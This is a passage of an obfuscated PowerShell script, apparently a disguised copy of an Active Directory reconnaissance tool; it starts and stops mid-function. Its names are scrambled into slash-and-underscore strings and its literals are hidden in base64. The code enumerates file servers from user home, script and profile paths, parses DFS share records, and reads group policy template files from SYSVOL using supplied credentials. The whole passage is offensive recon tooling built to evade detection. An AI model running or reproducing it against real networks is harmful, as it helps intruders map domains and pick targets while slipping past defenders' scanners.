            $(ForEach(${/=\/==\___/\_/\/=} in ${__/\_______/\/=\/}.FindAll()) {if (${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {_/======\/==\___/=(${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if (${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {_/======\/==\___/=(${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if (${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {_/======\/==\___/=(${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | sort -Unique
        }
    }
}
function Get-DomainDFSShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        function _/==\/\/=\____/=\/ {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${__/=\/===\/\/\/\__}
            )
            ${_/===\/\__/==\/=\} = ${__/=\/===\/\/\/\__}
            ${/===\/\__/=\___/=} = [bitconverter]::ToUInt32(${_/===\/\__/==\/=\}[0..3],0)
            ${__/\__/\__/\__/=\} = [bitconverter]::ToUInt32(${_/===\/\__/==\/=\}[4..7],0)
            ${__/===\/=\/\__/\/=} = 8
            ${_/=\_/\__/\__/===} = @()
            for(${/==\__/===\__/\__}=1; ${/==\__/===\__/\__} -le ${__/\__/\__/\__/=\}; ${/==\__/===\__/\__}++){
                ${/====\/\____/=\/\} = ${__/===\/=\/\__/\/=}
                ${/===\_/=\/=\/\/==} = ${__/===\/=\/\__/\/=} + 1
                ${/==\__/=\____/=\/} = [bitconverter]::ToUInt16(${_/===\/\__/==\/=\}[${/====\/\____/=\/\}..${/===\_/=\/=\/\/==}],0)
                ${_/\/==\_/=====\/=} = ${/===\_/=\/=\/\/==} + 1
                ${_____/\_/==\/=\/=} = ${_/\/==\_/=====\/=} + ${/==\__/=\____/=\/} - 1
                ${__/\/=\/\__/=\_/\} = [System.Text.Encoding]::Unicode.GetString(${_/===\/\__/==\/=\}[${_/\/==\_/=====\/=}..${_____/\_/==\/=\/=}])
                ${__/\/\_____/\___/} = ${_____/\_/==\/=\/=} + 1
                ${_/\/\__/\__/=\/=\} = ${__/\/\_____/\___/} + 3
                ${___/\___/\___/\_/} = [bitconverter]::ToUInt32(${_/===\/\__/==\/=\}[${__/\/\_____/\___/}..${_/\/\__/\__/=\/=\}],0)
                ${__/\_____/===\/\_} = ${_/\/\__/\__/=\/=\} + 1
                ${_____/\/\/====\/\} = ${__/\_____/===\/\_} + ${___/\___/\___/\_/} - 1
                ${_/\______/\/=\_/\} = ${_/===\/\__/==\/=\}[${__/\_____/===\/\_}..${_____/\/\/====\/\}]
                switch -wildcard (${__/\/=\/\__/=\_/\}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABzAGkAdABlAHIAbwBvAHQA'))) {  }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABkAG8AbQBhAGkAbgByAG8AbwB0ACoA'))) {
                        ${____/\/====\/==\/} = 0
                        ${_/\_/==\/\/===\_/} = 15
                        ${_/\__/=====\/\___} = [byte[]]${_/\______/\/=\_/\}[${____/\/====\/==\/}..${_/\_/==\/\/===\_/}]
                        ${_/\_/==\_/=\_/=\/} = New-Object Guid(,${_/\__/=====\/\___}) 
                        ${/=======\/====\_/} = ${_/\_/==\/\/===\_/} + 1
                        ${/===\_/=\_/=\/=\_} = ${/=======\/====\_/} + 1
                        ${__/===\_/=\/=\/==} = [bitconverter]::ToUInt16(${_/\______/\/=\_/\}[${/=======\/====\_/}..${/===\_/=\_/=\/=\_}],0)
                        ${_/=\/===\/=\__/==} = ${/===\_/=\_/=\/=\_} + 1
                        ${/===\_/====\/\_/=} = ${_/=\/===\/=\__/==} + ${__/===\_/=\/=\/==} - 1
                        ${_/=\/\/===\___/==} = [System.Text.Encoding]::Unicode.GetString(${_/\______/\/=\_/\}[${_/=\/===\/=\__/==}..${/===\_/====\/\_/=}])
                        ${/==\/=\__/\/\_/\/} = ${/===\_/====\/\_/=} + 1
                        ${/=\/\/===\___/===} = ${/==\/=\__/\/\_/\/} + 1
                        ${/===\/====\/==\/\} = [bitconverter]::ToUInt16(${_/\______/\/=\_/\}[${/==\/=\__/\/\_/\/}..${/=\/\/===\___/===}],0)
                        ${____/\__/=\_/\___} = ${/=\/\/===\___/===} + 1
                        ${___/\/======\/\__} = ${____/\__/=\_/\___} + ${/===\/====\/==\/\} - 1
                        ${_/\_/=\/===\/==\/} = [System.Text.Encoding]::Unicode.GetString(${_/\______/\/=\_/\}[${____/\__/=\_/\___}..${___/\/======\/\__}])
                        ${____/\_/===\_/\__} = ${___/\/======\/\__} + 1
                        ${__/\/===\__/\___/} = ${____/\_/===\_/\__} + 3
                        ${_/=\/\/\_/\/\/\__/} = [bitconverter]::ToUInt32(${_/\______/\/=\_/\}[${____/\_/===\_/\__}..${__/\/===\__/\___/}],0)
                        ${__/\/\_/\/==\_/\_} = ${__/\/===\__/\___/} + 1
                        ${__/\___/\__/=\_/\} = ${__/\/\_/\/==\_/\_} + 3
                        ${_/\/\/\/\/\_/\__/} = [bitconverter]::ToUInt32(${_/\______/\/=\_/\}[${__/\/\_/\/==\_/\_}..${__/\___/\__/=\_/\}],0)
                        ${__/\/\__/=\__/\_/} = ${__/\___/\__/=\_/\} + 1
                        ${_/\___/\__/\____/} = ${__/\/\__/=\__/\_/} + 1
                        ${_/\__/\____/=\_/=} = [bitconverter]::ToUInt16(${_/\______/\/=\_/\}[${__/\/\__/=\__/\_/}..${_/\___/\__/\____/}],0)
                        ${_/=\_/=\_/==\___/} = ${_/\___/\__/\____/} + 1
                        ${__/\__/\___/===\/} = ${_/=\_/=\_/==\___/} + ${_/\__/\____/=\_/=} - 1
                        if (${_/\__/\____/=\_/=} -gt 0)  {
                            ${/===\/=\/\_/==\_/} = [System.Text.Encoding]::Unicode.GetString(${_/\______/\/=\_/\}[${_/=\_/=\_/==\___/}..${__/\__/\___/===\/}])
                        }
                        ${___/=\/===\_/\___} = ${__/\__/\___/===\/} + 1
                        ${/===\/=\/\/\/\_/\} = ${___/=\/===\_/\___} + 7
                        ${__/=\_/\__/=\_/\/} = ${_/\______/\/=\_/\}[${___/=\/===\_/\___}..${/===\/=\/\/\/\_/\}] 
                        ${/==\_/==\_____/==} = ${/===\/=\/\/\/\_/\} + 1
                        ${_/=\/\_/=\___/\/\} = ${/==\_/==\_____/==} + 7
                        ${___/\_/==\/=\/===} = ${_/\______/\/=\_/\}[${/==\_/==\_____/==}..${_/=\/\_/=\___/\/\}]
                        ${/=\/=\/=\/\_/=\_/} = ${_/=\/\_/=\___/\/\} + 1
                        ${_/\/===\/\/=\/==\} = ${/=\/=\/=\/\_/=\_/} + 7
                        ${_/==\_/\/=====\_/} = ${_/\______/\/=\_/\}[${/=\/=\/=\/\_/=\_/}..${_/\/===\/\/=\/==\}]
                        ${/=\__/=\_/====\/\} = ${_/\/===\/\/=\/==\}  + 1
                        ${_____/\_/\/===\_/} = ${/=\__/=\_/====\/\} + 3
                        $version = [bitconverter]::ToUInt32(${_/\______/\/=\_/\}[${/=\__/=\_/====\/\}..${_____/\_/\/===\_/}],0)
                        ${__/\/\__/=====\__} = ${_____/\_/\/===\_/} + 1
                        ${_/\/\_/\/\/=\_/\_} = ${__/\/\__/=====\__} + 3
                        ${/=\_/=\_/\/\/\_/\} = [bitconverter]::ToUInt32(${_/\______/\/=\_/\}[${__/\/\__/=====\__}..${_/\/\_/\/\/=\_/\_}],0)
                        ${_______/==\/=\__/} = ${_/\/\_/\/\/=\_/\_} + 1
                        ${_/=\/==\_/\/=\__/} = ${_______/==\/=\__/} + ${/=\_/=\_/\/\/\_/\} - 1
                        ${__/\______/\/===\} = ${_/\______/\/=\_/\}[${_______/==\/=\__/}..${_/=\/==\_/\/=\__/}]
                        ${_/=\/\_____/\/===} = ${_/=\/==\_/\/=\__/} + 1
                        ${_/\/\/==\/\/===\_} = ${_/=\/\_____/\/===} + 3
                        ${_/========\/\/\__} = [bitconverter]::ToUInt32(${_/\______/\/=\_/\}[${_/=\/\_____/\/===}..${_/\/\/==\/\/===\_}],0)
                        ${__/=\/\/==\/\/\_/} = ${_/\/\/==\/\/===\_} + 1
                        ${___/\/===\/\_/=\_} = ${__/=\/\/==\/\/\_/} + ${_/========\/\/\__} - 1
                        ${___/===\______/==} = ${_/\______/\/=\_/\}[${__/=\/\/==\/\/\_/}..${___/\/===\/\_/=\_}]
                        ${__/=\_/\/=\/\/\/=} = ${___/\/===\/\_/=\_} + 1
                        ${_____/\__/==\/=\_} = ${__/=\_/\/=\/\/\/=} + 3
                        ${_/===\/===\/=\___} = [bitconverter]::ToUInt32(${_/\______/\/=\_/\}[${__/=\_/\/=\/\/\/=}..${_____/\__/==\/=\_}],0)
                        ${_/\/\___/=\/=\___} = 0
                        ${__/\/\__/====\_/\} = ${_/\/\___/=\/=\___} + 3
                        ${_/=\/\/\___/=\/=\} = [bitconverter]::ToUInt32(${__/\______/\/===\}[${_/\/\___/=\/=\___}..${__/\/\__/====\_/\}],0)
                        ${_/==\__/==\_/=\_/} = ${__/\/\__/====\_/\} + 1
                        for(${_/\____/\/\/\_/\_}=1; ${_/\____/\/\/\_/\_} -le ${_/=\/\/\___/=\/=\}; ${_/\____/\/\/\_/\_}++){
                            ${_/\/===\_/=\_____} = ${_/==\__/==\_/=\_/}
                            ${___/\/\__/=\/==\_} = ${_/\/===\_/=\_____} + 3
                            ${_/\/\_/=\/\_____/} = [bitconverter]::ToUInt32(${__/\______/\/===\}[${_/\/===\_/=\_____}..${___/\/\__/=\/==\_}],0)
                            ${/======\/\/=\/\__} = ${___/\/\__/=\/==\_} + 1
                            ${__/\/\_/\_/\__/\_} = ${/======\/\/=\/\__} + 7
                            ${/===\_/\_/\__/===} = ${__/\______/\/===\}[${/======\/\/=\/\__}..${__/\/\_/\_/\__/\_}]
                            ${_/\/=\__/=\_____/} = ${__/\/\_/\_/\__/\_} + 1
                            ${_/\/=\/\_/\/===\/} = ${_/\/=\__/=\_____/} + 3
                            ${/=\___/\/\___/=\/} = [bitconverter]::ToUInt32(${__/\______/\/===\}[${_/\/=\__/=\_____/}..${_/\/=\/\_/\/===\/}],0)
                            ${_/\/=\/\_/===\___} = ${_/\/=\/\_/\/===\/} + 1
                            ${____/\/=\_____/\_} = ${_/\/=\/\_/===\___} + 3
                            ${_/\__/====\/\/\_/} = [bitconverter]::ToUInt32(${__/\______/\/===\}[${_/\/=\/\_/===\___}..${____/\/=\_____/\_}],0)
                            ${/=\__/\/\/\/\/=\_} = ${____/\/=\_____/\_} + 1
                            ${/=\/==\/\/==\/\/\} = ${/=\__/\/\/\/\/=\_} + 1
                            ${/\_____/\/=\/==\/} = [bitconverter]::ToUInt16(${__/\______/\/===\}[${/=\__/\/\/\/\/=\_}..${/=\/==\/\/==\/\/\}],0)
                            ${/=\___/=\_/=\/===} = ${/=\/==\/\/==\/\/\} + 1
                            ${/=\/=\/\___/\_/==} = ${/=\___/=\_/=\/===} + ${/\_____/\/=\/==\/} - 1
                            ${/=\_/==\__/=\/=\_} = [System.Text.Encoding]::Unicode.GetString(${__/\______/\/===\}[${/=\___/=\_/=\/===}..${/=\/=\/\___/\_/==}])
                            ${/===\/=\_/=\_/===} = ${/=\/=\/\___/\_/==} + 1
                            ${_/\/\/==\_/\____/} = ${/===\/=\_/=\_/===} + 1
                            ${___/==\_/\_____/\} = [bitconverter]::ToUInt16(${__/\______/\/===\}[${/===\/=\_/=\_/===}..${_/\/\/==\_/\____/}],0)
                            ${/=\/=\__/\/===\/\} = ${_/\/\/==\_/\____/} + 1
                            ${_/\_/\___/==\___/} = ${/=\/=\__/\/===\/\} + ${___/==\_/\_____/\} - 1
                            ${/=\/\__/\_/\/\/==} = [System.Text.Encoding]::Unicode.GetString(${__/\______/\/===\}[${/=\/=\__/\/===\/\}..${_/\_/\___/==\___/}])
                            ${___/=\/==\/======} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8APQBcAC8APQBcAF8AfQBcACQAewAvAD0AXAAvAFwAXwBfAC8AXABfAC8AXAAvAFwALwA9AD0AfQA=')))
                            ${_/==\__/==\_/=\_/} = ${_/\_/\___/==\___/} + 1
                        }
                    }
                }
                ${__/===\/=\/\__/\/=} = ${_____/\/\/====\/\} + 1
                ${____/=\_/\/======} = @{
                    'Name' = ${__/\/=\/\__/=\_/\}
                    'Prefix' = ${_/=\/\/===\___/==}
                    'TargetList' = ${___/=\/==\/======}
                }
                ${_/=\_/\__/\__/===} += New-Object -TypeName PSObject -Property ${____/=\_/\/======}
                ${_/=\/\/===\___/==} = $Null
                ${__/\/=\/\__/=\_/\} = $Null
                ${___/=\/==\/======} = $Null
            }
            ${_/\___/\/\__/====} = @()
            ${_/=\_/\__/\__/===} | % {
                if ($_.TargetList) {
                    $_.TargetList | % {
                        ${_/\___/\/\__/====} += $_.split('\')[2]
                    }
                }
            }
            ${_/\___/\/\__/====}
        }
        function __/=\_____/\__/=\/ {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            ${_/=\_/===\_/==\/\} = __/=\/\_/\/=\__/=\ @PSBoundParameters
            if (${_/=\_/===\_/==\/\}) {
                ${__/====\_____/==\} = @()
                ${_/=\_/===\_/==\/\}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AZgBUAEQAZgBzACkAKQA=')))
                try {
                    ${/==\_/=\____/===\} = ${_/=\_/===\_/==\/\}.FindAll()
                    ${/==\_/=\____/===\} | ? {$_} | % {
                        $Properties = $_.Properties
                        ${__/\___/\/====\__} = $Properties.remoteservername
                        ${__/=\/===\/\/\/\__} = $Properties.pkt
                        ${__/====\_____/==\} += ${__/\___/\/====\__} | % {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAEQARgBTACAAcwBoAGEAcgBlACAAOgAgACQAXwA=')))
                            }
                        }
                    }
                    if (${/==\_/=\____/===\}) {
                        try { ${/==\_/=\____/===\}.dispose() }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                        }
                    }
                    ${_/=\_/===\_/==\/\}.dispose()
                    if (${__/=\/===\/\/\/\__} -and ${__/=\/===\/\/\/\__}[0]) {
                        _/==\/\/=\____/=\/ ${__/=\/===\/\/\/\__}[0] | % {
                            if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA=')))) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
                }
                ${__/====\_____/==\} | sort -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
        function _/=\/\_/\_/\__/\__ {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            ${_/=\_/===\_/==\/\} = __/=\/\_/\/=\__/=\ @PSBoundParameters
            if (${_/=\_/===\_/==\/\}) {
                ${__/====\_____/==\} = @()
                ${_/=\_/===\_/==\/\}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AbQBzAEQARgBTAC0ATABpAG4AawB2ADIAKQApAA==')))
                $Null = ${_/=\_/===\_/==\/\}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAZgBzAC0AbABpAG4AawBwAGEAdABoAHYAMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAEQARgBTAC0AVABhAHIAZwBlAHQATABpAHMAdAB2ADIA')))))
                try {
                    ${/==\_/=\____/===\} = ${_/=\_/===\_/==\/\}.FindAll()
                    ${/==\_/=\____/===\} | ? {$_} | % {
                        $Properties = $_.Properties
                        ${___/=\/==\/======} = $Properties.'msdfs-targetlistv2'[0]
                        ${/=\/===\__/=\__/=} = [xml][System.Text.Encoding]::Unicode.GetString(${___/=\/==\/======}[2..(${___/=\/==\/======}.Length-1)])
                        ${__/====\_____/==\} += ${/=\/===\__/=\__/=}.targets.ChildNodes | % {
                            try {
                                ${_/========\/=\___} = $_.InnerText
                                if ( ${_/========\/=\___}.Contains('\') ) {
                                    ${/=\__/\/\___/\_/=} = ${_/========\/=\___}.split('\')[3]
                                    ${/=\_/\_/=\__/\_/\} = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8AXwAvAFwALwBcAF8AXwBfAC8AXABfAC8APQB9ACQAewAvAD0AXABfAC8AXABfAC8APQBcAF8AXwAvAFwAXwAvAFwAfQA=')));'RemoteServerName'=${_/========\/=\___}.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAHQAYQByAGcAZQB0ACAAOgAgACQAXwA=')))
                            }
                        }
                    }
                    if (${/==\_/=\____/===\}) {
                        try { ${/==\_/=\____/===\}.dispose() }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                        }
                    }
                    ${_/=\_/===\_/==\/\}.dispose()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
                }
                ${__/====\_____/==\} | sort -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
    }
    PROCESS {
        ${__/====\_____/==\} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                    ${__/====\_____/==\} += __/=\_____/\__/=\/ @/=\___/=\__/=\/\/
                }
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                    ${__/====\_____/==\} += _/=\/\_/\_/\__/\__ @/=\___/=\__/=\/\/
                }
            }
        }
        else {
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                ${__/====\_____/==\} += __/=\_____/\__/=\/ @/=\___/=\__/=\/\/
            }
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                ${__/====\_____/==\} += _/=\/\_/\_/\__/\__ @/=\___/=\__/=\/\/
            }
        }
        ${__/====\_____/==\} | sort -Property ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))) -Unique
    }
}
function _/==\/\/\/\/\_/\/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        ${__/====\/\__/=\/=},
        [Switch]
        ${__/\_/\/=\/\_/\_/=},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${__/\/=\_/==\/\/==} = @{}
    }
    PROCESS {
        try {
            if ((${__/====\/\__/=\/=} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${__/\/\_/\_/\/=\/=} = "\\$((New-Object System.Uri(${__/====\/\__/=\/=})).Host)\SYSVOL"
                if (-not ${__/\/=\_/==\/\/==}[${__/\/\_/\_/\/=\/=}]) {
                    ___/=\_/\_/=\/\_/\ -Path ${__/\/\_/\_/\/=\/=} -Credential $Credential
                    ${__/\/=\_/==\/\/==}[${__/\/\_/\_/\/=\/=}] = $True
                }
            }
            ${__/=\/======\/=\/} = ${__/====\/\__/=\/=}
            if (-not ${__/=\/======\/=\/}.EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBpAG4AZgA='))))) {
                ${__/=\/======\/=\/} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAFAAYQByAHMAaQBuAGcAIABHAHAAdABUAG0AcABsAFAAYQB0AGgAOgAgACQAewBfAF8ALwA9AFwALwA9AD0APQA9AD0APQBcAC8APQBcAC8AfQA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                ${_____/=\_/=====\_} = ______/==\/\/===== -Path ${__/=\/======\/=\/} -__/\_/\/=\/\_/\_/= -ErrorAction Stop
                if (${_____/=\_/=====\_}) {
                    ${_____/=\_/=====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${__/=\/======\/=\/}
                    ${_____/=\_/=====\_}
                }
            }
            else {
                ${_____/=\_/=====\_} = ______/==\/\/===== -Path ${__/=\/======\/=\/} -ErrorAction Stop
                if (${_____/=\_/=====\_}) {
